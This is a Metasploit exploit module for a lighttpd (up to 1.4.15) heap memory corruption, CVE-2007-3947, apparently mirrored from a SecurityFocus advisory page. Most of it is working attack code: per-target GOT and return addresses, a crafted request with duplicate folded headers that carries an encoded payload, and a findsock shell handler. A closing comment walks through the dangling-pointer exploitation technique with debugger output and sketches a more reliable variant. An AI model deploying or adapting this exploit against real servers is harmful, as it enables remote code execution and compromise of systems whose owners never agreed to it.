source: http://www.securityfocus.com/bid/24967/info

Lighttpd is prone to multiple remote denial-of-service vulnerabilities, a code-execution vulnerability, and an information-disclosure vulnerability.

An attacker can exploit these issues to execute arbitrary code, access sensitive information, or crash the affected application, denying service to legitimate users.

These issues affect versions prior to lighttpd 1.4.16. 

require 'msf/core'

module Msf

class Exploits::Linux::Http::Lighttpd_Header_Folding < Msf::Exploit::Remote
   
   include Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Lighttpd <= 1.4.15 Heap Memory Corruption',
			'Description'    => %q{
            This module exploits a heap based memory corruption in Lighttpd <= 1.4.15.
            This vulnerability is caused due to danling pointer dereference while handling
            folded http headers.
			},
			'Author'         => [ 'Abhisek Datta [abhisek.datta<at>gmail.com]' ],
			'License'        => BSD_LICENSE, # BeerWare too!
			'Version'        => '',
			'References'     =>
				[
	  				['CVE', '2007-3947'],
					['BID', '24967'],
					['URL', 'http://www.lighttpd.net/assets/2007/7/24/lighttpd_sa2007_03.txt'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 200,
					'BadChars' => "\x00\x0a\x0d\x80\xff",
					'MinNops'  => 64,
               'Keys'     => ['+findsock']
				},
			'Platform'       => 'linux',
			'Arch'           => ARCH_X86,
			'Targets'        => 
         #
         # This is a race against malloc family of functions. JmpAddr is GOT.PLT entry for
         # malloc() since it is first malloc family function called after heap corruption.
         # In all recent implementations, malloc() will detect heap corruption and trigger
         # abort() so we target malloc() GOT entry. This method is very unreliable, afterall
         # a good exploit means ./pwn and should be target less
         #
				[
               ['Linux Gentoo/2.6/glibc-2.4/lighttpd-1.4.15', { 'JmpAddr' => 0x080731a0, 'Ret' => 0xffffe411 }], # unreliable
               ['Linux Fedora Core 5/lighttpd-1.4.15', {'JmpAddr' => 0x0806c790, 'Ret' => 0x41414141 }],
               ['Linux Fedora Core 5/lighttpd-1.4.15-1.fc5', {'JmpAddr' => 0x080711dc, 'Ret' => 0xa0b0c0d0 }],
					['Linux Debug', { 'JmpAddr' => 0x41424344, 'Ret' => 0x41414141 }],
				],
			'DisclosureDate' => ''))
			
			register_options( [ Opt::RPORT(3001) ], self.class )
	end

   def check
      response = send_request_raw({'uri' => '/'}, 5)

      if response.nil?
         print_status("No response to request")
         return Exploit::CheckCode::Safe
      end

      version = response['Server']
      if version.to_s =~ /lighttpd\/([0-9]+).([0-9]+).([0-9]+)/
         return Exploit::CheckCode::Appears if (($1.to_i == 1) and ($2.to_i == 4) and ($3.to_i <= 15))
      end

      return Exploit::CheckCode::Safe
   end

	def exploit
      if target.name =~ /^Linux/
         exploit_linux(target)
      end
	end

   def exploit_linux(target)
      print_status("Trying to exploit #{target.name} JmpAddr: 0x%x Ret: 0x%x" % [target['JmpAddr'], target['Ret']])

      what = target.ret
      where = target['JmpAddr'] - 3
      jumper = Rex::Arch::X86.jmp_short(64)
      off = 0x42424242 - 27
      loc = where - off + 1 - 27

      send_http("GET", "\x23BB#{jumper}AA.html") do # $esi points to our GET .. string
         [
            {'Host'        => datastore['RHOST'] + ':' + datastore['RPORT'] },
            {'User-Agent'  => payload.encoded },
            {'Dummy1'      => rand_text_alphanumeric(100) },
            {'Dummy2'      => rand_text_alphanumeric(100) },
            {'Dummy3'      => rand_text_alphanumeric(100) },
            {'User-Agent'  => rand_text_alphanumeric(9) },
            {' '           => rand_text_alphanumeric(13) + [loc].pack('V') + [off].pack('V') + rand_text_alphanumeric(4)},
            {' '           => rand_text_alphanumeric(1) + [what].pack('V') + rand_text_alphanumeric(5)}
         ]
      end

      handler  # findsock
   end

   def send_http(method, path, sock = nil, read_response = false)
      client = connect
      request = String.new
      opts = yield

      request << "#{method} #{path} HTTP/1.1\r\n"
      opts.each {|h| request << "#{h.keys[0].to_s}#{h.keys[0].to_s.strip.empty? ? "" : ":"} #{h[h.keys[0]].to_s}\r\n"}
      request << "\r\n\r\n"
      
      print_status("Sending #{request.length} bytes of data")
      client.send_request(request)
      
      if read_response
         res = client.read_response(5)
         print_status("Read #{res.to_s.length} bytes of data")

         return res
      end
   end

end
end	

=begin
   Vuln:
      * lighttpd maintains an array (struct array) to store http headers as key value pairs
      * in case of a duplicate header entry, the source data string (struct data_string *ds) is
        free'd
      * If there is folding in the duplicate header field, value of the entry is copied to the free'd
        memory (dangling pointer dereference)
      * If realloc is triggered during copy (buffer_prepare_append) or later, heap corruption is detected
        by libc memory allocator and abort() is triggered

   Problem:
      * *BSD/phkmalloc: struct pgfree/pginfo needs to be targeted
      * Linux/ptmalloc2 detects memory corruption through the sanity checks
      * Upto 63 bytes of data can be copied to dangling area in heap, if more, realloc is triggered which
        detects heap corruption and abort()s

   VooDoo:
      * Exploitable in linux because of nice _small_ chunk handlings :)
         * ds->value -> X
         * ds->value->ptr -> X - y
      * Exploitable because lighttpd abstract data type structures on heap and its handling

   * Linux/2.6 trick *
      * On sending duplicate http header, http_request_parse() calls array_insert_unique
        which finds the previous entry of the duplicate key in hash and appends the value
        and deletes the duplicate instance (struct data_string *ds) (data_string.c)
      * In case of a folding in the duplicate header entry, ds remains dangling pointer on
        heap which was free'd previously and the folded line is copied to ds->value->ptr thus
        allowing us to overwrite ds->value pointer due to special characteristics of DL/malloc
        8/16/32 byte chunk handlings
      * At the next line folding, our data is copied to ds->value->ptr (dangling ref) again but
        now we control ds->value and hence we have a arbitrary memory overwrite

        ---
        (gdb) r -D -f ./lighttpd.conf
        Starting program: /opt/lighthttpd/sbin/lighttpd -D -f ./lighttpd.conf
        Failed to read a valid object file image from memory.

        Program received signal SIGSEGV, Segmentation fault.
        0x41424344 in ?? ()
        (gdb) i r $eip
        eip            0x41424344       0x41424344
        (gdb)
        ---

   * Can be Reliable?? *
   Pass1: Dig the heap and fill it up with our data
   Pass2: Copy our data on dangling ptr (ds is free'd by array_insert_unique in case of duplicate key)
          *make sure realloc is not triggered in buffer_prepare_append*
   Pass3: Dummy connect to allocate new data_string on heap with function pointers
   Pass4: Attempt to copy *BIG* data on dangling ptr (need realloc corruption bypass) and overwrite function
          pointers
          close connection
          *triggered pwn*

   - Abhisek Datta (24/08/2007) abhisek[dot]datta[at]gmail[dot]com

    "In God we trust, everything else we virus scan"
      - Chintan
=end


